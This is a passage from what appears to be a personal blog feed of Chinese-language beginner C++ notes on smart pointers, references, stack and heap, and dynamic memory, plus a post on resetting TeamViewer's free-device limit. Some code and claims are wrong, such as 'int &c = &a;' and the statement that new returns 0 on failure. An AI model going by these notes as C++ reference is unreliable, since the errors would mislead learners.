&lt;&lt; *intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/006.png" class=""><p>先初始化了智能指针的值为0，p在指向智能指针<br>然后通过*p&#x3D;500也是成功修改了智能指针的值。</p><hr><h2 id="release"><a href="#release" class="headerlink" title="release()"></a>release()</h2><p>release会返回unique_ptr的指针将其置为nullptr，但是release不会释放占用的内存空间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123;<span class="number">0</span>&#125; &#125;;</span><br><span class="line">intP.<span class="built_in">release</span>();</span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/007.png" class=""><p><strong>虽然release将智能指针的地址置为nullptr了，但是我们说过，原先的内存没有释放掉，而且release会返回原先智能指针的地址</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123;<span class="number">0</span>&#125; &#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br><span class="line">p = intP.<span class="built_in">release</span>();</span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/008.png" class=""><p>这样就可以看出没release之前intP的地址和release之后的结果。包括p接收了release返回的地址。</p><hr><h2 id="转移"><a href="#转移" class="headerlink" title="转移"></a>转移</h2><p>智能指针具有唯一性是上述提到过的。所以智能指针不能够被复制，但是有转移的方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123;<span class="number">0</span>&#125; &#125;;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP2&#123;&#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; intP2 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">intP2 = std::<span class="built_in">move</span>(intP);</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; intP2 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/009.png" class=""><p>看到intP被转移后地址被置为nullptr，intP2则获取了intP原先的地址。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这玩意目前还不知道应用场景在哪，毕竟不太习惯。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pointer浅挖</title>
      <link href="/2022/05/12/pointerP/"/>
      <url>/2022/05/12/pointerP/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>指针和数组还有很多知识点需要学习</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="sizeof-数组"><a href="#sizeof-数组" class="headerlink" title="sizeof(数组)"></a>sizeof(数组)</h2><p>大部分情况下，我们使用sizeof()，编译器都是需要一个运行过程的。<br>而我们反汇编sizeof求数组大小的时候会发现不一样的点：</p><img src="/2022/05/12/pointerP/000.png" class=""><p>能看到反汇编后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> size = <span class="built_in">sizeof</span>(ch);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>头两句只有一句反汇编代码，首先也是因为数组没有初始化。<br>其次就是他调用数组大小是20，编译器仿佛知道这个数组的大小了，14h也就是十六进制的写法，换算成十进制也就是20，数组有五个成员*4正好就是20。</p><p><strong>也就是之前说的，数组的底层实现是由指针实现的，数组本身是抽象的结构逻辑</strong><br>所以编译器会提前预览出数组的大小，以便后续使用。</p><hr><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>引用是一种阉割的指针版本。<br>虽然取址引用变量得到的是原值的内存地址，但是引用的变量本身也占用内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line">a = <span class="number">6</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a;</span><br><span class="line"><span class="type">int</span> &amp;c = a;</span><br><span class="line"><span class="type">int</span> *d = &amp;a;</span><br><span class="line">b = <span class="number">6</span>;</span><br><span class="line">c = <span class="number">6</span>;</span><br><span class="line">*d = <span class="number">6</span>;</span><br><span class="line">a = (<span class="type">int</span>)&amp;a;</span><br></pre></td></tr></table></figure><p>反汇编后看到：<img src="/2022/05/12/pointerP/001.png" class=""></p><ol><li>a的地址就是ebp-Ch</li><li>b的地址是ebp-18<br>在代码里我们看到&amp;b&#x3D;a之前，先将a的地址赋予eax，然后再将eax赋予b的地址上<br>这就说明了引用变量确实占用了内存。</li><li>c的地址就是ebp-24</li><li>d的地址就是ebp-30</li><li>b&#x3D;6的时候，先将b的地址的值赋给eax，引用b的地址在上述操作中为a的地址</li><li>c&#x3D;6和*d&#x3D;6 发现步骤相同，区别就在于各自的内存地址不一样。不过也印证引用和指针的关联性。</li></ol><hr><h2 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h2><p>空间分配：</p><ol><li>栈（操作系统）：由操作系统自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。</li><li>堆（操作系统）： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收，分配方式倒是类似于链表。</li></ol><p>百度而来的浅显答案。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"><span class="type">int</span> *d = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;b &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;c &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; d &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>得到结果：<img src="/2022/05/12/pointerP/002.png" class=""><br>可以看到abc三个变量的地址离得很近，但是d却很远，d现在打印的地址是new出来的，我们捎上变量d本身的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;b &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;c &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;d &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; d &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/12/pointerP/003.png" class=""><p>能看到d变量本身占用的内存地址里abc都是比较近的，因为他们都是挨着声明的，内存地址由计算机分配而来，也就是说这些变量的内存地址存放在栈区。<br>而new出来的那块内存则符合定义中由人为分配的，处于堆区。</p><p><strong>栈区是程序在编译时就确定了大小的一段内存区域，主要用于存放临时变量，其效率也会高于堆，但是因为事先就确定了大小，导致了容量有限的问题，当然可以在编译前指定栈的大小，不过涉及到的东西有点多</strong></p><p>另外就是栈比较有意思的是，他的结构是自上向下的结构，遵循先入后出顺序。</p><img src="/2022/05/12/pointerP/004.png" class=""><p>随便画张草图理解一下。<br>ebp通过地址减去得到变量的地址。当变量的声明周期全部结束了的时候，ebp的地址就会和esp一样了</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>主要是浅看指针和数组和引用的关系，然后就是顺便理解堆栈的概念，因为反汇编多次出现了，总要先looklook。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>teamviewer设备上限</title>
      <link href="/2022/05/11/teamvieweruser/"/>
      <url>/2022/05/11/teamvieweruser/</url>
      
        <content type="html"><![CDATA[<h1 id="teamviewer设备上限"><a href="#teamviewer设备上限" class="headerlink" title="teamviewer设备上限"></a>teamviewer设备上限</h1><span id="more"></span><p>远程桌面软件只接触过向日癸和teamviewer两种，但后面实际上tv用的比较多。<br>但商业是收费的，个人用限制设备。<br>以前也是零零散散登录过几次，没太注意，这次换了电脑重新安装提示免费设备到限制了。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>首先进入<a href="https://login.teamviewer.com/nav/home">官网</a><br>第一次在新设备上登录还要邮箱重新验证</p><p>登陆进去之后看到左上角</p><img src="/2022/05/11/teamvieweruser/000.jpg" class=""><p>点击配置文件进入后，找到免费设备</p><img src="/2022/05/11/teamvieweruser/001.jpg" class=""><blockquote><p>值得注意的是剩余更次数默认只有两次</p></blockquote><p>如果非特殊情况。在登陆到其他设备时可以选择仅使用一次而不是信任该设备，假设真的真的没次数的话，那就建议新建个账号了。如果没有这么多邮箱电话什么的</p><p>可以在编辑配置文件中右边看到删除账户</p><img src="/2022/05/11/teamvieweruser/002.jpg" class=""><p>据说删除了之后还可以使用原来的邮箱重新注册，然后之前的设备限制又变成了两台。。还蛮有意思的。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>结束</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>quote</title>
      <link href="/2022/05/10/quote/"/>
      <url>/2022/05/10/quote/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>引用看起来会很突兀，因为&amp;符号<br>引用的语法是：<code>数据类型 &amp;变量名称 = 引用对象名称</code></p><p>例如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a;</span><br></pre></td></tr></table></figure><span id="more"></span><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引用之后，我们对b进行的操作，其实都是变相对a进行了操作</span></span><br><span class="line">b = <span class="number">200</span>;    <span class="comment">//那么a的值就会 = 200；</span></span><br></pre></td></tr></table></figure><p><strong>当然引用可以有多个，比如我再新建b1，b2，b3，都可以引用变量a</strong></p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a;</span><br><span class="line"><span class="type">int</span> &amp;b2 = a;</span><br><span class="line"><span class="type">int</span> &amp;b3 = a;</span><br><span class="line"></span><br><span class="line">b3++;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; b2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; b3 &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/10/quote/000.png" class=""><p>再看看它们的地址: <img src="/2022/05/10/quote/001.png" class=""><br>发现地址一模一样，这样看上去引用好像有点拉跨。</p><p>但是放在别的情况下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> x : a)&#123;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> x : a)&#123;</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/10/quote/002.png" class=""><p>这个时候x只是作为一个调用的变量，x的自增，不会改变a的元素，如果把x作为引用：</p><img src="/2022/05/10/quote/002.png" class="">就能看到a的元素都递增了。<blockquote><p>虽然在这个例子中，感受不到引用带来的速度变化，但实际作用中还是很可观的。</p></blockquote><hr><h2 id="引用的小毛病"><a href="#引用的小毛病" class="headerlink" title="引用的小毛病"></a>引用的小毛病</h2><p>当一个引用初始化后，又想改变引用的对象了，但是这个对象已经是代表之前引用的对象了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> &amp;c = &amp;a;</span><br><span class="line">c = b; <span class="comment">//这里的c已经是代表a了，c=b，就是相当于a=b，是非常不可取的</span></span><br></pre></td></tr></table></figure><blockquote><p>在现有手段中，我们知道常量是不可变的。为了保险可以使用const</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> &amp;c = a;</span><br><span class="line">c = b; <span class="comment">//这里就会报错了。</span></span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>初次体验引用还是比较容易接受的。等到和函数混合用的时候或许会上一档次。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针动态内存分配</title>
      <link href="/2022/05/07/dynamicsmemory/"/>
      <url>/2022/05/07/dynamicsmemory/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在正常情况下，声明一个数组时<code>type arrayName [arraySize]</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">//就是将是个成员全部初始化为0</span></span><br><span class="line"><span class="type">int</span> ch2[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;; <span class="comment">//没指定大小，但是有初始化，那么数组的大小就会根据初始化成员个数而定</span></span><br></pre></td></tr></table></figure><span id="more"></span><p>还有一种情况就是arraySize是const类型或者#define，因为在规范里定义了，声明数组大小的时候必须是常量表达式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[N] = &#123; <span class="number">0</span> &#125;;  <span class="comment">//合法，N是常量</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> ch2[a] = &#123; <span class="number">0</span> &#125;; <span class="comment">//合法，a是常量</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> ch3[b] = &#123; <span class="number">0</span> &#125;; <span class="comment">//不合法，b是一个变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/07/dynamicsmemory/000.png" class=""><p>至于为什么不能是变量，放到最后再说。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>这就不得不提c语言的malloc函数了<code>void* malloc(size_t size)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//malloc 是向计算机申请一片内存使用，所以参数为type*typesize</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>)*<span class="number">10</span>); <span class="comment">//sizeof(type)更加直观，当然熟记类型大小也问题不大，就是怕在32位和64位下有区别，建议保守使用sizeof获取变量类型大小</span></span><br><span class="line"><span class="comment">//然后就是如何使用这片内存，学过指针，所以我们会将地址抛给指针</span></span><br><span class="line"><span class="type">int</span> *p = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>)*<span class="number">10</span>); <span class="comment">//这里会提示类型不符合，因为malloc原型是void*，所以需要强制转换</span></span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>)*<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">p[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">p[<span class="number">2</span>] = <span class="number">1</span>*<span class="number">2</span>;</span><br><span class="line"><span class="comment">//都是合法的，[前提是不超过分配的内存大小]，这个在指针那里就说过了为什么合法</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>当然，malloc如果没有申请到内存就会返回0，指针得到的结果也就为0</strong></p><hr><h2 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h2><p><code>void * calloc(size_t count,size_t size)</code><br>差别到不是太大，就是两个形参，一个是个数，一个是类型大小。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = (<span class="type">int</span>*)<span class="built_in">calloc</span>(<span class="number">10</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span>*)<span class="built_in">calloc</span>(<span class="number">10</span>,<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="comment">//当然10可以用变量代替</span></span><br></pre></td></tr></table></figure><p><strong>同样的，如果没有成功分配到内存，返回也是0，好处是calloc分配完内存后会进行初始化，而malloc则没有这么贴心</strong></p><hr><h2 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h2><p>re可能就会联想到重新,realloc就是重新分配内存<br><code>void* realloc(voir* _Block, size_t_size)</code></p><blockquote><p>先判断当前的指针是否有足够的连续空间，如果有，扩大mem_address指向的地址，并且将mem_address返回，如果空间不够，先按照newsize指定的大小分配空间，将原有数据从头到尾拷贝到新分配的内存区域，而后释放原来mem_address所指内存区域（注意：原来指针是自动释放，不需要使用free），同时返回新分配的内存区域的首地址。即重新分配存储器块的地址。<br>——摘自百度百科</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>) * <span class="number">10</span>);</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">p = (<span class="type">int</span>*)<span class="built_in">realloc</span>(p, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/07/dynamicsmemory/001.png" class=""><blockquote><p>这里可以看到经过扩容之后的内存，起始位置发生了改变，但是原本p[0]上的1还是存在</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>) * <span class="number">10</span>);</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> *p2 = p;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">p = (<span class="type">int</span>*)<span class="built_in">realloc</span>(p, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>然后改成缩小，并且用一个指针先记录p原先的地址，在realloc前后各打印一次</p><img src="/2022/05/07/dynamicsmemory/002.png" class=""><blockquote><p>可以看到经过realloc之后指针p的首地址发生了改变。符号百度的情况</p></blockquote><p>但是上述两种都是基于x64编译的，试了下x86编译的，发现不论是扩大还是缩小，内存首地址居然没变化</p><img src="/2022/05/07/dynamicsmemory/003.png" class=""><p>起初还以为是vs2022做了什么优化，又用了clion试了一下：</p><img src="/2022/05/07/dynamicsmemory/004.png" class=""><blockquote><p>发现好像是malloc的不够大，超过好几倍的时候才会申请新的空间拖拽，不然就是首地址往后或者前操作。</p></blockquote><p>回到vs2022上,将<code>p = (int*)realloc(p, 200);</code>修改成200。</p><img src="/2022/05/07/dynamicsmemory/005.png" class=""><p>能够看到p的地址果然发生改变了。</p><img src="/2022/05/07/dynamicsmemory/006.png" class=""><p>由大缩小后首地址不变。</p><p>x64下同理：<img src="/2022/05/07/dynamicsmemory/007.png" class=""></p><p><strong>那么malloc就符合之前的描述：当内存足够时，realloc的内存&#x3D;原本内存+剩余内存，当内存不够时，realloc会申请新的内存并将原来的内存拷贝到新内存里，旧的将被free掉。</strong></p><hr><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p><code>void free(void* _Block)</code>,_Block就是要释放的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">free</span>(p); </span><br><span class="line"><span class="comment">//free完之后，原本的指针会变成悬挂指针也叫野指针，因为它现在没法用了</span></span><br><span class="line"><span class="comment">//常见情况下就是要么指针没有初始化，要么指针的对象生命周期到了，也就是局部变量离开作用域后失效</span></span><br><span class="line"><span class="comment">//还有一种就是free完之后，尽量将指针置空或者置零。</span></span><br><span class="line">p = <span class="literal">NULL</span>; <span class="comment">//或者=0,以后处理的工作大了也可以定义一个宏或者函数去处理这种事件</span></span><br></pre></td></tr></table></figure><p>但是连续free一块内存空间是会出点毛病的，具体要看编译器怎么处理了。</p><hr><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><p><code>数据类型 *变量名 = new 数据类型：int *p = new int;</code><br><code>数据类型 *变量名 = new 数据类型[arraySize]: int *p = new int[5];</code></p><blockquote><p>老规矩分配失败返回0</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line"><span class="type">int</span> *p2 = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实底层还是malloc那套，我们随便打个断点反汇编进去，一步步看：</p><img src="/2022/05/07/dynamicsmemory/008.png" class=""><p>所以万变不离其宗，封装再好，也能看到底层，我们也能模仿造轮子。</p><p>其次就是之前说过的，动态分配的内存，都需要我们手动释放，malloc那些用free，而new 对应的时delete</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line"><span class="keyword">delete</span> p2;<span class="comment">//p2是分配了五个int类型的内存，所以这里会产生警告，不然你只是delete掉p2首地址</span></span><br></pre></td></tr></table></figure><img src="/2022/05/07/dynamicsmemory/009.png" class=""><p>所以数组需要加上[]消除，<code>delete []p2</code></p><img src="/2022/05/07/dynamicsmemory/010.png" class=""><p>可以看到程序没有报错和警告。</p><hr><h2 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h2><h3 id="野指针"><a href="#野指针" class="headerlink" title="野指针"></a>野指针</h3><p>前面提到过的悬挂指针问题：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 